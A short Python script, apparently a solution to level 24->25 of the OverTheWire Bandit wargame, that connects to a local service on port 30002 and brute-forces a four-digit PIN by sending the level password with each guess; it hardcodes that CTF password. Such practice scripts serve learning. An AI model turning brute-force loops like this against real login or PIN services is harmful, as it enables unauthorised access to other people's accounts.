#!/usr/bin/python3

# bruteforce script for 
# lvl. 24->25 in the bandit ctf games
# @ overthewire

import random
import socket

#password for bandit 23->24
password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'

PORT = 30002
KEY_SPACE = 10000
class PinFoundException(Exception):
    pass

def table_maker()->[]:
    table = []
    while len(table) < KEY_SPACE:
        pin = "".join([str(random.randint(0,9)) for i in range(4)])
        if pin in table: continue
        else: table.append(pin)
    return table


#create pin table
pin_table = table_maker()

#create socket connection to 30002 on localhost
skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
skt.connect(('localhost', PORT))
res = skt.recv(4096)
print(res.decode())

try:
    for pin in pin_table:
        string = "%s %s\r\n"%(password, pin)
        print("[+] Trying %s"%(pin))
        skt.send(string.encode())
        res = skt.recv(4096)
        if "Wrong!" in res.decode().strip():
            continue
        else:
            print("[!] Found [!]")
            print(res.decode())
            raise(PinFoundException)
except PinFoundException:
    pass
